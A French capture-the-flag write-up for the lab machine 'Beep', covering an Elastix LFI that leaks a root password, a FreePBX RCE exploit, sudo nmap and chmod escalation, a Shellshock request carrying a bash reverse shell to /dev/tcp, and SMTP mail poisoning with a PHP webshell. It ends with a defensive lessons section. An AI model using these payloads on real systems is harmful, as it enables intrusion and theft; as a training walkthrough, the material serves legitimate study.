![Cover](cover.png)

# Phase 1 : Reconnaissance & Brèche Initiale

L'énumération de **Beep** révèle une surface d'attaque particulièrement étendue. La machine semble héberger une suite complète de services de communication (PBX), ce qui multiplie les vecteurs d'entrée potentiels.

### Énumération des Services (Scanning)

Je commence par un scan **Nmap** complet pour identifier tous les ports ouverts, suivi d'un scan agressif sur les services détectés.

```bash
# Scan rapide de tous les ports
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.7

# Scan détaillé des services identifiés
nmap -sC -sV -p 22,25,80,110,111,143,443,745,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7
```

**Résultats clés :**
*   **Port 80/443** : Serveur Apache 2.2.3 (CentOS) faisant tourner **Elastix**, une solution de téléphonie IP.
*   **Port 10000** : Interface de gestion **Webmin** 1.570.
*   **Port 25** : Service **SMTP** (Postfix).
*   **Port 4559/5038** : Services liés à la téléphonie (**HylaFAX**, **Asterisk**).

> **Schéma Mental :** L'abondance de services sur une version obsolète de **CentOS 5** suggère une machine "legacy" où les vulnérabilités de type **Local File Inclusion (LFI)** ou **Remote Code Execution (RCE)** sur des composants web mal maintenus sont probables.

---

### Énumération Web & Directory Bruteforcing

Le port 80 redirige systématiquement vers le port 443. En accédant à l'interface, je confirme la présence d'**Elastix**. Je lance un **Directory Bruteforcing** pour identifier des points d'entrée cachés.

```bash
dirsearch.py -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php -t 50
```

Le scan révèle plusieurs répertoires intéressants :
*   `/admin` : Interface d'administration FreePBX (nécessite une authentification).
*   `/vtigercrm` : Instance de CRM intégrée à la solution.
*   `/recordings` : Interface d'accès aux enregistrements audio.

---

### Identification de la Vulnérabilité : Local File Inclusion (LFI)

En utilisant **Searchsploit**, je recherche des vulnérabilités connues pour **Elastix**. Une vulnérabilité critique de type **LFI** est identifiée dans le module **vTigerCRM**.

```bash
searchsploit elastix
# Exploit identifié : Elastix 2.2.0 - 'graph.php' Local File Inclusion (37637.pl)
```

La vulnérabilité réside dans le paramètre `current_language` du script `/vtigercrm/graph.php`. Ce paramètre n'est pas assaini, permettant de traverser l'arborescence (**Path Traversal**) et de lire des fichiers sensibles. De plus, l'utilisation du **Null Byte** (`%00`) permet de tronquer l'extension `.php` ajoutée par le serveur sur les anciennes versions de PHP.

**Vecteur d'attaque LFI :**
```text
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action
```

> **Schéma Mental :** L'objectif ici n'est pas seulement de lire `/etc/passwd`, mais de cibler les fichiers de configuration de l'application (**amportal.conf**) qui contiennent souvent des identifiants en clair pour la base de données ou les comptes administrateurs.

---

### Extraction de Credentials & Premier Accès

La lecture de `/etc/amportal.conf` via la **LFI** permet de récupérer des mots de passe critiques :

*   `AMPDBPASS=jEhdIekWmdjE`
*   `AMPMGRPASS=jEhdIekWmdjE`

Je teste immédiatement la réutilisation de mot de passe (**Credential Reuse**) sur les différents services. Le mot de passe `jEhdIekWmdjE` s'avère être celui du compte **root** pour plusieurs services.

#### Accès via SSH
```bash
ssh root@10.10.10.7
# Password: jEhdIekWmdjE
```

#### Accès via Webmin (Port 10000)
L'accès avec `root:jEhdIekWmdjE` fonctionne également sur l'interface **Webmin**, offrant un contrôle total sur le système via le navigateur.

### Vecteurs Alternatifs identifiés

Bien que l'accès **SSH** direct soit la voie la plus simple, d'autres vecteurs de brèche initiale ont été confirmés lors de la reconnaissance :
1.  **RCE (Remote Code Execution)** : Via l'exploit `18650.py` ciblant une vulnérabilité dans l'extension d'appel de FreePBX (nécessite une configuration SSL spécifique pour accepter les protocoles obsolètes comme **TLSv1.0**).
2.  **Shellshock** : Le service **Webmin** sur le port 10000 est vulnérable à **Shellshock** via le header `User-Agent` sur la page `/session_login.cgi`.
3.  **Log Poisoning via SMTP** : En envoyant un email contenant un payload PHP à un utilisateur local (ex: `asterisk@localhost`), puis en incluant le fichier de log mail `/var/mail/asterisk` via la **LFI**, il est possible d'obtenir un **Webshell**.

---

### Énumération Interne via Local File Inclusion (LFI)

Une fois la vulnérabilité **Local File Inclusion** identifiée sur `/vtigercrm/graph.php`, ma priorité est l'extraction de secrets et de fichiers de configuration. Sur une distribution **CentOS** ancienne comme celle-ci, les fichiers de configuration de l'**IPBX** (Asterisk/Elastix) contiennent souvent des identifiants en clair.

```bash
# Lecture du fichier de configuration principal d'Elastix/FreePBX
curl -k "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action"
```

L'extraction révèle plusieurs mots de passe critiques :
*   `AMPDBPASS = jEhdIekWmdjE`
*   `ARI_ADMIN_PASS = jEhdIekWmdjE`
*   `CDBAPASS = jEhdIekWmdjE`

> **Schéma Mental :**
> LFI (Accès fichiers) -> `/etc/amportal.conf` (Extraction secrets) -> **Credential Reuse** (Test des mots de passe sur SSH/Webmin/Databases).

---

### Mouvement Latéral : Remote Code Execution (RCE)

Si le **Credential Reuse** direct échoue ou pour diversifier les points d'entrée, j'exploite une **RCE** connue sur **FreePBX** (CVE-2012-4869). Le script `18650.py` permet d'injecter des commandes via le paramètre d'extension.

En raison de la vétusté des protocoles **SSL/TLS** (SSLv3/TLS1.0) sur la cible, je dois ajuster mon environnement local et le script :

```python
# Ajustement du contexte SSL en Python pour ignorer les erreurs de certificat
import ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Modification de l'appel urllib
urllib.urlopen(url, context=ctx)
```

Exécution du reverse shell pour obtenir un accès initial en tant qu'utilisateur `asterisk` :
```bash
# Listener local
nc -lnvp 443

# Exécution de l'exploit (nécessite une extension valide, ex: 233 trouvée via svwar)
python2 18650.py 10.10.10.7 233
```

---

### Escalade de Privilèges : De `asterisk` à `root`

Une fois le shell obtenu en tant qu'utilisateur `asterisk`, je procède à l'énumération des vecteurs d'escalade. La commande `sudo -l` révèle une configuration extrêmement permissive.

```bash
asterisk@beep$ sudo -l
User asterisk may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /usr/bin/yum
    ...
```

#### Méthode 1 : Exploitation de `nmap` (Mode Interactif)
Les versions anciennes de **nmap** possèdent un mode interactif permettant l'exécution de commandes système.

```bash
sudo nmap --interactive
nmap> !bash
root@beep# id
uid=0(root) gid=0(root)
```

#### Méthode 2 : Manipulation de permissions via `chmod`
Je peux utiliser les droits `sudo` sur `chmod` pour poser un bit **SUID** sur le binaire `/bin/bash`.

```bash
sudo chmod 4755 /bin/bash
bash -p
```

---

### Vecteurs Alternatifs et Persistance

#### Credential Reuse (SSH & Webmin)
Le mot de passe `jEhdIekWmdjE` extrait via la **LFI** s'avère être celui du compte `root`. Cela permet un accès direct via **SSH** ou sur l'interface **Webmin** (Port 10000).

#### Shellshock (CVE-2014-6271)
Le serveur utilise des scripts **CGI** anciens. Je peux injecter des commandes via le header `User-Agent` lors d'une requête vers `/session_login.cgi`.

```bash
# Test de vulnérabilité Shellshock
curl -k -H "User-Agent: () { :; }; /bin/sleep 10" https://10.10.10.7:10000/session_login.cgi
```

#### Mail Poisoning & Webshell
En l'absence de shell direct, j'utilise le service **SMTP** pour injecter du code PHP dans les logs de messagerie, puis je l'exécute via la **LFI**.

> **Schéma Mental :**
> **SMTP** (Envoi de code PHP) -> `/var/mail/asterisk` (Stockage du payload) -> **LFI** (Inclusion et exécution du code).

```bash
# Injection du payload via swaks
swaks --to asterisk@localhost --body '<?php system($_REQUEST["cmd"]); ?>' --server 10.10.10.7

# Exécution via LFI
curl -k "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&cmd=id"
```

---

# Phase 3 : Élévation de Privilèges & Domination (Root/Admin)

Une fois l'accès initial obtenu ou les informations d'identification extraites via la vulnérabilité **Local File Inclusion (LFI)**, plusieurs vecteurs permettent d'atteindre le privilège **root**. La machine Beep est une illustration parfaite de la "mort par mille coupures" : une multitude de services mal configurés et obsolètes.

### Vecteur 1 : Exploitation des droits Sudo (Post-RCE asterisk)

Si l'accès est obtenu via l'exploit **Remote Code Execution (RCE)** (script `18650.py`), nous tombons avec l'identité de l'utilisateur `asterisk`. L'énumération des privilèges via `sudo -l` révèle une configuration catastrophique.

```bash
# Vérification des droits sudo
sudo -l

# Sortie notable :
# (root) NOPASSWD: /usr/bin/nmap
# (root) NOPASSWD: /bin/chmod
```

#### Méthode A : Nmap Interactive Mode
Sur les anciennes versions de **nmap**, le mode interactif permet d'exécuter des commandes système avec les privilèges du binaire.

```bash
sudo nmap --interactive
nmap> !sh
# id
uid=0(root) gid=0(root)
```

#### Méthode B : Abus de Chmod (SUID)
Puisque nous pouvons exécuter `chmod` en tant que **root**, nous pouvons modifier les permissions de `/bin/bash` pour y ajouter le bit **SUID**.

```bash
sudo chmod 4755 /bin/bash
/bin/bash -p
# id
euid=0(root)
```

> **Schéma Mental :**
> Droits **Sudo** excessifs -> Binaire avec fonction de "shell out" ou modification de permissions -> Escalade directe vers **root**.

---

### Vecteur 2 : Credential Reuse (SSH & Webmin)

L'exploitation de la **LFI** sur `/vtigercrm/graph.php` a permis de lire le fichier de configuration `/etc/amportal.conf`. Ce fichier contient des mots de passe en clair utilisés pour la base de données et les services internes.

**Password trouvé :** `jEhdIekWmdjE`

Le **Credential Reuse** est ici total. Ce mot de passe est partagé par le compte **root** pour l'accès **SSH** et l'interface d'administration **Webmin** (port 10000).

```bash
# Accès direct via SSH
ssh root@10.10.10.7
# Password: jEhdIekWmdjE
```

---

### Vecteur 3 : Shellshock (Webmin CGI)

Le service **Webmin** (version 1.570) tourne sur le port 10000. Étant donné l'ancienneté du système (CentOS 5), il est vulnérable à **Shellshock** via ses scripts **CGI**.

> **Schéma Mental :**
> Requête HTTP -> Serveur Web passe les Headers en variables d'environnement -> Bash vulnérable interprète les fonctions malformées `() { :; };` -> Exécution de code arbitraire avant même l'authentification.

L'injection se fait dans le header `User-Agent` lors d'une requête sur `/session_login.cgi`.

```http
POST /session_login.cgi HTTP/1.1
Host: 10.10.10.7:10000
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.2/443 0>&1
Content-Length: 28

page=%2F&user=root&pass=root
```

---

### Vecteur 4 : LFI to RCE via Mail Poisoning

Si l'accès direct échoue, nous pouvons transformer la **LFI** en **RCE** en injectant du code PHP dans un fichier que nous pouvons lire. Le service **SMTP** (port 25) permet d'envoyer un mail à un utilisateur local (ex: `asterisk`), ce qui crée un fichier dans `/var/mail/asterisk`.

1. **Injection du Payload via SMTP :**
```bash
telnet 10.10.10.7 25
MAIL FROM:<attacker@kali.org>
RCPT TO:<asterisk@localhost>
DATA
Subject: Webshell
<?php system($_REQUEST['cmd']); ?>
.
QUIT
```

2. **Exécution via LFI :**
Il suffit ensuite d'appeler le fichier de mail via le paramètre vulnérable en utilisant un **Null Byte** (`%00`) pour stopper la concaténation de l'extension `.php` par l'application.

```url
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&cmd=id
```

---

### Analyse Beyond Root

La compromission de Beep met en lumière plusieurs échecs critiques de sécurité :

1.  **Obsolescence logicielle (Legacy Systems) :** Le système tourne sur une version de **CentOS** en fin de vie, rendant le noyau et les services vulnérables à des failles critiques comme **Shellshock**.
2.  **Mauvaise gestion des secrets :** Le stockage de mots de passe en clair dans des fichiers de configuration (`/etc/amportal.conf`) accessibles via une **LFI** a permis un **Credential Reuse** immédiat sur **SSH**.
3.  **Principe du moindre privilège non respecté :** L'utilisateur `asterisk` disposait de droits **Sudo** sur des binaires dangereux (`nmap`, `chmod`), transformant une compromission de service mineure en une prise de contrôle totale du serveur.
4.  **Surface d'attaque excessive :** Trop de services inutiles (HylaFAX, Cyrus IMAP, MySQL, etc.) sont exposés, multipliant les points d'entrée potentiels. Une segmentation réseau ou un **Hardening** des services aurait limité l'impact.